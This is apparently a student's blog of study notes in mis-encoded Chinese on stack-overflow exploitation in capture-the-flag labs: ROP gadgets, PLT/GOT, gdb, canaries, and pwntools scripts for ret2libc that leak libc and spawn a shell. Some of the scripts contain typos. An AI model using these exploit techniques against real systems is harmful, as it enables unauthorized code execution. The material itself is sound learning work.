æ•‘å¤§å‘½è¸©å‘ï¼ï¼ï¼è¾“å…¥æ ¼å¼æˆ‘å“­æ­»&#x2F;(ã„’oã„’)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span>  <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">grep</span> <span class="string">eax</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ROPgadget</span> --binary æ–‡ä»¶å --only <span class="string">&quot;int&quot;</span>(æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ å½“ä¸º<span class="number">0</span>x80æ—¶ä¸­æ–­ç»“æŸ<span class="number">0</span>x80è¡¨ç¤ºè¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„call)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p><p>python3ä¸­å¿…é¡»ç”¨bè½¬æ¢ä¸ºå­—èŠ‚æµå‹æ•°æ® generatorè½¬æ¢å™¨ nextï¼ˆï¼‰å‡½æ•°ï¼ˆå‰+hexè½¬ä¸ºåå…­è¿›åˆ¶ï¼‰ï¼ï¼è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°æ®wwå…¶å®ä¸å¦‚ROPgadgetæ¥çš„æ–¹ä¾¿å–½ï¼ˆç›®å‰ä¸ªäººè§‰å¾—ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --<span class="built_in">binary</span> æ–‡ä»¶å --<span class="built_in">string</span> <span class="string">&#x27;/bin/sh&#x27;</span> (æŸ¥è¯¢åé—¨åœ°å€)</span><br></pre></td></tr></table></figure><p>ret2text ret2shellcode å‡ç›´æ¥å«æœ‰åé—¨å‡½æ•° ret2text è‡ªæ¥æ”¶ä¸€ä¸²base64è§£ç å¾—flag ret2shellcode</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_execve<span class="function"><span class="params">()</span> -&gt;</span><span class="number">0xb</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>å†…æ ¸ç³»ç»Ÿè°ƒç”¨å‡½æ•°å                            ç”¨æˆ·è°ƒç”¨ä»£å·<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p><p>é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p><p>åŒºåˆ«ï¼š<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p><p>é™æ€é“¾æ¥æ–¹ä¾¿æ‰¾åˆ°gadgetï¼šé™æ€é“¾æ¥å°†åº“å‡½æ•°å…¨éƒ¨å†™å…¥elfæ–‡ä»¶æœ¬èº« å®¹æ˜“ç”¨æŒ‡é’ˆç‰‡æ®µæ„æˆæ”»å‡»æµ<br>åŠ¨æ€é“¾æ¥åªæ˜¯åšäº†æ ‡è®°ï¼Œç”¨å³æ‹¿ï¼ˆåˆ«å¤„å€Ÿxxä¾‹ï¼šprintfè°ƒç”¨vprintfã€2000å¤šè¡Œ è¿˜è¦å†è°ƒå“äººçš„å˜ã€‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p><p>é™æ€é“¾æ¥åœ¨é“¾æ¥æ—¶è¿›è¡Œ åŠ¨æ€é“¾æ¥åœ¨è£…è½½æ—¶è¿›è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p><p>putså‡½æ•°åŠ¨æ€é“¾æ¥åœ¨å¯æ‰§è¡Œæ®µcodeè½½å…¥ï¼ˆåªä¸ºè™šæ‹Ÿå†…å­˜åœ°å€ã€libcå…¨è½½å…¥ã€‘ä½†å¹¶ä¸çŸ¥çœŸå®åœ°å€ï¼‰åœ¨è¿è¡Œæ—¶å¯æ‰¾æ­¤æ—¶pltç»“è§£æä½¿å¾—putså†…å®¹å¡«å…¥dataæ®µgot.pltæ–‡ä»¶ã€pltåœ¨ä»£ç æ®µ gotåœ¨æ•°æ®æ®µã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> -fro-pie -g -m32 -o link åŠ¨æ€é“¾æ¥æ–‡ä»¶å(<span class="number">32</span>ä½)</span><br><span class="line"><span class="attribute">gcc</span> -fro-pie -g -<span class="number">0</span> link åŠ¨æ€é“¾æ¥æ–‡ä»¶åï¼ˆ<span class="number">64</span>ä½ï¼‰</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p><p>æŸ¥çœ‹plt  x åœ°å€â€”â€”&gt;ä»¥äºŒè¿›åˆ¶å½¢å¼æŸ¥çœ‹</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">pwndbg</span> disass åœ°å€-&gt;</span>åæ±‡ç¼–</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p><p>info b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯  b è¡Œå·å¯ä¸‹æ–­ç‚¹ï¼ˆå«Cä»£ç æƒ…å†µä¸‹ï¼‰ d è¡Œå·å¯åˆ é™¤æ–­ç‚¹ã€æ— Cè¯­è¨€ b åœ°å€ä¸‹æ–­ç‚¹ã€‘<br>c é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹&#x2F;è¾“å…¥ï¼ˆputsï¼‰&#x2F;ç¨‹åºä¸­æ–­ </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b main == <span class="built_in">start</span> ã€è‹¥æ— mainå‡½æ•°åˆ™åœåœ¨ç¨‹åºå…¥å£ç¬¬ä¸€æ¡ï¼ˆ<span class="built_in">start</span>æ‰ä¸ºç¨‹åºå…¥å£ï¼‰ã€‘</span><br><span class="line">s æ­¥è¿› n æ­¥è¿‡</span><br><span class="line">backtrace å‡½æ•°è°ƒç”¨æ ˆã€å‘ˆç°ç¥–å­™å…³ç³»ï¼ˆğŸ˜€ï¼‰ã€‘</span><br><span class="line"><span class="literal">return</span> ç›´æ¥å›åˆ°mainå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> secure()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">input</span>; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="keyword">time</span>(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = <span class="keyword">rand</span>();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;<span class="keyword">input</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">input</span> == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125; <span class="comment">//æ­¤å¤„systemå‡½æ•°è™½æ— åé—¨ ä½†æä¾›system pltè¡¨è±¡ ä½¿å¾—åœ¨textä¸­å¯è‡ªåŠ¨å°†æ‰§è¡Œæµæ‹‰å…¥libcæ®µ</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p><p>amd64å‘ä¸‹å…¼å®¹x86æ•…å«æœ‰eax<br>å‡½æ•°<strong>è°ƒç”¨æ ˆ</strong>åœ°å€ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ã€æ›´å¥½çš„åˆ©ç”¨è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‘ï¼ˆå¯„å­˜å™¨ä¸ºä½åœ°å€å‘é«˜åœ°å€å¢é•¿å³å…ˆå…¥åå‡ºï¼‰</p><p>ã€åç»­ç”»å›¾è¡¥å…… å¥½æ‡’ï¼ˆæˆ‘çœŸè¯¥æ­»å•Š å¿˜äº†çš„æ—¶å€™å°±çŸ¥é“åŠ¨æ‰‹è®°å½•äº†ğŸ˜¶ï¼‰ã€‘<strong>èµç½ªå½•ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">ç”»çš„å¤ªæ’‡äº†ï¼ˆç¬‘ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p><p>æ‰§è¡Œå®Œè°ƒç”¨è¿”å›dyntestï¼ˆå‡åœ¨å†…å­˜ç©ºé—´ä¸­ï¼‰</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p><p><strong>ã€è°ƒç”¨æµç¨‹ä¸¤ç‚¹éœ€æ³¨æ„ã€‘</strong>ï¼ˆx86ä¾‹ï¼‰</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p><p>fatherä¸­ä¹Ÿå«æœ‰å­å‡½æ•°æ‰€éœ€arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p><p>æŸ¥è¡¨æ˜“çŠ¯é”™è¯¯ï¼ˆç›´æ¥è°ƒgotï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ret</span> = system@got(âŒ)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&quot;./dyntest&quot;</span>)</span><br><span class="line">[</span><br><span class="line">  æ–‡ä»¶å½¢å¼åŠä¿æŠ¤</span><br><span class="line">]</span><br><span class="line">elf.got[<span class="string">&quot;puts&quot;</span>]<span class="regexp">//</span>è·å–å‡½æ•°è¡¨è±¡åœ°å€</span><br><span class="line">hex(elf.got[<span class="string">&quot;puts&quot;</span>])<span class="regexp">//</span>è·å–å‡½æ•°çœŸå®åœ°å€</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" alt="image-20230419203107813"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419215529699.png" alt="image-20230419215529699"></p><p>ã€nop slideã€‘<br>ä½¿å¾—ASLRç»§ç»­æ‰§è¡Œret2shellcode<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423182143460.png" alt="image-20230423182143460"></p><p>ä½¿æ‰§è¡Œæµä¸€ç›´åœ¨nopæ®µï¼ˆmaybeè¿æ°”ä¸å¥½eipæŒ‡ä¸åˆ°nopä½ç½® å¤šè¿è¡Œå‡ æ¬¡å³å¯ï¼‰<br>coreæ–‡ä»¶ï¼šè®°è½½ç¨‹åºå´©æºƒæ—¶æ–­ç‚¹ä¿¡æ¯åŠé”™è¯¯ä¿¡æ¯<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230423193313158.png" alt="image-20230423193313158"></p><p>å¯ä»¥çœ‹æˆè°æ”¾çš„æ•°æ®å°±ä¸ºè°çš„æ ˆå¸§<br>å‡½æ•°å¾€ä¸Šç¬¬äºŒä¸ªå­—é•¿å†™å…¥å…¶æ‰€éœ€è¦çš„å‚æ•°ï¼ˆå¤§éƒ¨åˆ†å‡½æ•°ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194347199.png" alt="image-20230423194347199"></p><p>systemè°ƒç”¨ret addråè‡ªåŠ¨pushçˆ¶å‡½æ•°ebpã€å‡½æ•°å†…æ±‡ç¼–ç¬¬ä¸€æ­¥push ebpå‡å‘ä¸Šå†™ä¸¤å­—é•¿åˆ°valuableã€‘<br>æœ€åä¸¤ä¸ªå‡½æ•°æ‰§è¡Œæ­¤ç±»æ¨¡å¼å³å¯å®Œæˆæ”»å‡»</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194601499.png" alt="image-20230423194601499"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230423194754995.png" alt="image-20230423194754995"></p><p>ropé“¾å°†å‡½æ•°æ‰€éœ€å‚æ•°ç›´æ¥å†™å…¥åˆ°ä¸Šä¸€å‡½æ•°çš„è¿”å›åœ°å€å¤„<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424192129082.png" alt="image-20230424192129082"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424194313669.png" alt="image-20230424194313669"></p><p>æ— â€&#x2F;bin&#x2F;shâ€ä¹Ÿå¯æ˜ å°„ systemå‡½æ•°åœ°å€ï¼ˆtextæ®µ pltï¼‰è‹¥æ— pltåˆ™éœ€æŒç»­æº¢å‡ºç›´è‡³å‡ºç°çœŸå®åœ°å€<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195822728.png"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424195913266.png"></p><p>æˆ‘æ˜¯å°å· æ— éœ€exitï¼ˆï¼‰ã€å·å®Œå°±è·‘ã€‘ğŸ¤­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ret2libc1 | grep <span class="regexp">/bin/</span>sh</span><br><span class="line"><span class="regexp">//</span>string a.out | grep flag(ç®€å•é€†å‘)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230424200850159.png" alt="image-20230424200850159"></p><p>ã€ret2libc1ã€‘<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205359479.png" alt="image-20230424205359479"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424204704035.png" alt="image-20230424204704035"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424205428601.png" alt="image-20230424205428601">å°å°ç¨‹åºå‘˜&gt;&lt;<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230424210938062.png" alt="image-20230424210938062"></p><p>åŠ¨æ€è°ƒè¯•108+4ï¼ˆebpï¼‰æº¢å‡ºã€ret2libc2ã€‘<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125354842.png" alt="image-20230425125354842"></p><p>æ— â€œ&#x2F;bin&#x2F;shâ€ æ­¤æ—¶éœ€è‡ªè¡Œæ„é€  åœ¨bssæ®µæ‰¾åˆ°å¯å†™å…¥éƒ¨åˆ† </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425125119149.png" alt="image-20230425125119149">         </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230425153257042.png" alt="image-20230425153257042"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230426210301792.png" alt="image-20230426210301792"></p><p>è¿›é˜¶ç‰ˆæ€è·¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line"></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">system_plt = <span class="number">0x08048490</span></span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x804a080</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>,gets_plt,pop_ebx,buf2,system_plt,<span class="number">0xdeadbeef</span>(pop_ebx),buf2])</span><br><span class="line"><span class="comment">#ç¬¦åˆretçš„å¯„å­˜å™¨å‡å¯ä¸ä¸€å®šä¸€å®šæ˜¯pop_ebx</span></span><br><span class="line">io.seneline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin.sh&#x27;</span>)</span><br><span class="line">io.interactieve()</span><br></pre></td></tr></table></figure><p>ã€ret2libc3ã€‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v8 = strtol(&amp;buf, v4, v5); å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•°å­˜å‚¨åœ¨v8é‡Œ</span><br><span class="line">long <span class="built_in">int</span> strtol(const char *<span class="built_in">str</span>, char **endptr, <span class="built_in">int</span> base)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202338093.png" alt="image-20230427202338093"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230427202101873.png" alt="image-20230427202101873"><br>æ³¨æ„æˆ‘ä»¬è¾“é€sendçš„å€¼è¦ç”¨strã€ç¨‹åºæ¥æ”¶çš„æ€»æ˜¯strã€‘ linuxç³»ç»Ÿä¸‹æœ€å°å•ä½ä¸€å¶ï¼ˆ4kbï¼‰<br>&#x2F;bin&#x2F;sh(é€šè¿‡ç»å¯¹åœ°å€è¾“å…¥binä¸­çš„sh)&#x3D;&#x3D;sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#lld ret2libc3æŸ¥çœ‹æœ¬åœ°libc(åŠ¨æ€)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]))<span class="comment">#é˜²bugä¸ç¨‹åºä¿æŒä¸€è‡´</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot; :&quot;</span>)</span><br><span class="line">libcBase = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">&quot;puts&quot;</span>]<span class="comment">#drop=Trueä¸ä¿ç•™è¿”å›å€¼ï¼ˆæ­¤å¤„ä¸ºæ¥æ”¶ä½†ä¸ä¿ç•™\nï¼‰</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt;&#123;:#x&#125;&quot;</span>,<span class="built_in">format</span>(libcBase))<span class="comment">#ç”¨æ¥debug ç»“æœæ­£ç¡®åè¿›è¡Œæ‰“å° &#123;:#&#125;æ ¼å¼åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">#formatè½¬æ¢æ ¼å¼ å‰xè¡¨ç¤ºè½¬æ¢ä¸ºåå…­è¿›åˆ¶</span></span><br><span class="line"><span class="comment">#oneGadget = libcBase + 0x3a9fc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat(cyclic(60),oneGadget)</span></span><br><span class="line">payload=flat(cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>åç§»ï¼šæ–‡ä»¶æŸä¸€ä¸ªä½ç½®è·æ–‡ä»¶å¼€å¤´ç¬¬ä¸€ä¸ªå­—èŠ‚è·ç¦»</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-<span class="number">2.23</span>.so<span class="function"><span class="params">(åŠ¨æ€é“¾æ¥æ–‡ä»¶å)</span>-&gt;</span>å¾—åç§»é‡ <span class="comment">#ç¢°è¿æ°”å–½ğŸ˜€</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230428193230160.png" alt="image-20230428193230160"></p><p>gdbè°ƒè¯•<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230511094407053.png" alt="image-20230511094407053"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-<span class="built_in">mode</span>-parent è§£å†³è¯¥é—®é¢˜ï¼ˆgdbä¸­ï¼‰</span><br></pre></td></tr></table></figure><p>x64ç¯å¢ƒä¸‹ä¼ å‚è¦å…ˆä¼ å…¥å…­ä¸ªå¯„å­˜å™¨ä¸­ï¼ˆrdi rsi rdx rcx r8 r9 ï¼‰<br>åŠ«æŒç¨‹åºè¿”å›åˆ°ç›®çš„å‡½æ•°ä¹‹å‰è¦å…ˆæŠŠç›®çš„å‡½æ•°çš„å‚æ•°ä¼ é€’å®Œæ¯•ï¼ˆå³ä¼ é€’å‚æ•°çš„gadgetæ”¾åœ¨ç›®æ ‡å‡½æ•°ä¹‹å‰ï¼‰ä»»ä½•æ—¶å€™æ•°æ®çš„å†™å…¥éƒ½æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å†™å…¥<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520224921532.png" alt="image-20230520224921532"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230520225916659.png" alt="image-20230520225916659"></p><p>ä¸€èˆ¬æœ‰jzè·³è½¬æç¤ºï¼ˆä¸€é•¿ä¸²pop å¯„å­˜å™¨ï¼‰**[lib_csu]**</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230521000849599"></p><p>æ³¨æ„çœ‹åœ°å€ï¼ˆå¦‚å›¾ä¸­ediåªå¯å†™ä½å…«ä½ï¼‰<br>libcæ³„éœ²æŠ€å·§ï¼šæ‰¾åˆ°å…³é”®å‡½æ•°ï¼ˆå¦‚writeã€è¿”å›æ—¶æœ‰æ ˆæº¢å‡ºã€‘ï¼‰å¯¹åº”çš„çš„pltä¸‹got ç”¨å‡½æ•°çš„çœŸå®åœ°å€-å‡½æ•°åœ¨libcä¸­çš„åœ°å€&#x3D;libcåŸºåœ°å€ -&gt;æ‰¾system+â€œ&#x2F;bin&#x2F;shâ€åç§»ä¼ å…¥æ³„éœ²<br>ã€level3ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230522173452594.png" alt="image-20230522173452594"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523002237695.png"></p><p>å­¦ä¼šç”¨è½¬æ¢æio.recv(4&#x2F;8)</p><h3 id="ã€èŠ±å¼æ ˆæº¢å‡ºã€‘"><a href="#ã€èŠ±å¼æ ˆæº¢å‡ºã€‘" class="headerlink" title="ã€èŠ±å¼æ ˆæº¢å‡ºã€‘"></a><strong>ã€èŠ±å¼æ ˆæº¢å‡ºã€‘</strong></h3><p>1.ç¨‹åºä¸­æ— çœŸæ­£mainå‡½æ•°ï¼ˆdynï¼‰<br>start-&gt;libc_start_mian-&gt;init-&gt;main<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101555442.png" alt="image-20230523101555442"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523101634224.png" alt="image-20230523101634224"></p><p>æ­¤æ—¶æ ˆä¸­æ— æ ˆå¸§ å…¨éƒ¨å­˜å‚¨çš„shellé‡Œçš„ç¯å¢ƒå˜é‡ å…¶ä¸­è®°å½•äº†å½“å‰æ‰§è¡Œç¨‹åºçš„åå­—<br>æ‰¾ç¨‹åºå…¥å£ï¼šIDAï¼ˆå¯çˆ±å¥³äººï¼‰mainåœ°å€ gdbzhoä¸­ä¸‹æ–­ç‚¹è°ƒè¯• stackæŸ¥çœ‹æ ˆå¸§<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104215828.png" alt="image-20230523104215828"></p><p>checksecc å‘ç°canaryæ‰“å¼€ <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523104710354.png" alt="image-20230523104710354"></p><p>è¿è¡Œç¨‹åº æ‰‹åŠ¨è¶…é•¿æº¢å‡ºï¼ˆå¯åˆ©ç”¨pythonï¼‰æŸ¥çœ‹æç¤º ã€å¯ä»IDAä¸­è¾…åŠ©åˆ†æã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523105629335.png" alt="image-20230523105629335"></p><p>ä¹‹å‰ä¸ºsegment fault ç°whyä¸ºstack samshing<br>è¦†ç›–åè§¦å‘stack_chk_failå‡½æ•° å¼ºè¡Œé€€å‡ºç¨‹åº -&gt;stack smashing</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230523114523470.png" alt="image-20230523114523470"><br>å¦‚ä½•åœ¨å¯çˆ±å¥³äººä¸­è§‚å¯Ÿåˆ°Canaryï¼Ÿ<br>æ ‡å¿—ï¼šæ®µå¯„å­˜å™¨è¯»å…¥</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">v4</span> <span class="operator">=</span> _readfsqword(<span class="number">0</span>x28) //ğŸŒ°</span><br></pre></td></tr></table></figure><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230523122130079.png" alt="image-20230523122130079"></p><p>Canaryæ”¾ç½®æ— ç¡¬æ€§æ ‡å‡† éœ€åˆ†æ<br>elfæ–‡ä»¶è¾ƒå°æ—¶ 